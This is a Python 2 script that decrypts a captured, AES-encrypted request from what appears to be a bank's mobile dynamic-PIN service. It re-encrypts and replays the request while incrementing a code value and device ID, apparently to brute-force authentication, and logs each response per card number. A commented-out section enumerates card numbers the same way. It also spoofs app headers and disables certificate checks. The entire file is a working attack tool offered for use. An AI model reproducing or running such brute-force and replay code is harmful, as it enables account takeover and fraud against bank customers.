import base64
from Crypto.Cipher import AES
import requests

class AESCipher(object):
    def __init__(self): 
        self.bs = 32
        self.key = "[AES_KEY]"
        self.spliter = "a"
    def encrypt(self, raw):
        try:
            #raw = base64.b64decode(raw)
            raw = self._pad(raw)
            iv = "0000000000000000"
            cipher = AES.new(self.key, AES.MODE_ECB, iv)
            encData = cipher.encrypt(raw)
            return base64.b64encode(encData).decode('utf-8')
        except:
            print "Some Error."
    def decrypt(self, enc):
        try:
            enc = base64.b64decode(enc)
            iv = "0000000000000000"
            cipher = AES.new(self.key, AES.MODE_ECB, iv)
            decData = cipher.decrypt(enc)
            #print ord(decData[len(decData)-2])
            return decData
        except:
            print "Some Error."
    def _pad(self, s):
        return s + (16 - (len(s) % 16)) * chr(6)

MURL='https://[Domain]:[Port]/[URLPATH]'

def mobileSignBRUT(GETPARAM,card):
	headers={"EMethod": "AES2","REK": "sd+OOqPzc9XGvOgd9KHc0+tLxrilhcIs4Fu4fztqUtwhK6adyQb7mus0H/zwVtuxW9A/KFGQ+sx/pX8LuS8S0XNCy/CvWY3f/6dPc+kcGRLoX7RhEWSlsz/RDVhgdOjx+KvSMaWsB7wn5c/WlbufrTEw1F2GHNj2/3vfs+Pklis30+eo8QwJMW05itHsCV4yGMfh80bNi/2WOx4mHoxzLOeZmeRnVUvMfnd+J+2eOavLdyToGL5+HheSgq1Qsjcnsbwf3NAf8WUzuoCzbCH6Xrn0YF4DwcZaQytnmfLsYhtQ4dXnAqHnS3Pd3bezajAgHbCJSLS/8rA92SS4EWl4mg==", "Content-Type": "application/json","Content-Length": "384","User-Agent": "okhttp/3.10.0","User-Agent": "DynamicPin/1.2 (build:8; 8) retrofit/2.3.0)","Host": "[Domain]:1443","Connection": "close","Accept-Encoding": "gzip, deflate"}
	reqOBJ = requests.Session()
	resp=reqOBJ.post(MURL,GETPARAM,headers=headers,verify=False)
	f = open("mellatPayamresan.txt", "a")
	f.write(card + " ==>\r\n" + resp.content + '\r\n\r\n')
	f.close()
	print resp.content

AESObj = AESCipher()
tmpRequest = "PtxKH1pzcWKvb0iFK1bthqoNN4JPuMKnX6qfExFNjJlnbOx3PTIzNE8NVBZ17JkNoGgtEFsz0Tw2hBFoBQkIRSlcNO64GhUTaOUHJDY1O0pgdHuDEROUvAYd5BESCxFeKwuYCNXpPufxSj3b64yYZqofvl/VJDzHlPpxuyQloApjsk9VpCPhR8NtIsFuo9xtk5NabsktvaPTq53Ga8vfxRVzcmsFVKXULEDV5lklvskSfVuz6wuus5j4k09woZi5uqERnfBTri6rSRljxpuQ9lO5uoQaUNIdJIuU3mi2KPYh6bzLunx8vgPT5OFg4ZGr3oQEy+ia2GFAqoJ9jaVyqH3dF+yRa6WqLDUiLQonEt9wEsFr3omIGT/BTdRbpM673fRD9kdVxeUP4yiDgiEaP9Ni2brPsdeV6M+57vwPOkTS2ZtsjGRnRS0IRyJCiEl+gPIgnZtjXGtmY93o9JFz95xLRhLvkQIuGEoC+wx9ySaP9btqBQIJ/1JexAMT8f5wQ9cGhhTH/xxGEQqLSXYRYuIPAdIe7jQkcNakNKgL6BbqxKPM2Of3Lk9JqXx1Lanb/5W3tsVQeXp57Qvh3sHkSnoH5EW4wBa7zEwUe7LALBE="
tmp = AESObj.decrypt(tmpRequest)
print tmp
counter = 5100
DeviceID = 10000
card = 2000
while counter < 5200:
	tmp2 = tmp.replace('45ef',str(counter))
	tmp2 = tmp2.replace('11111',str(DeviceID))
	tmp2 = AESObj.encrypt(tmp2)
	mobileSignBRUT(tmp2, str(card))
	counter = counter + 1
	DeviceID = DeviceID + 1
#card = 164000
#num = 1001
#while card <= 164300:
#	try:
#		temp = tmp
#		temp = temp.replace('1111111',str(card))
#		temp = temp.replace('4da98df7-f218-329b-9421-4a9d3948362e' , '4da98df7-f218-329b-' + str(num) + '-4a9d3948362e')
#		temp = AESObj.encrypt(temp)
#		temp = "\"" + str(temp) + "\""
#		mobileSignBRUT(temp, str(card))
#		card = card + 1
#		num = num + 1
#	except:
#		print "Some Error."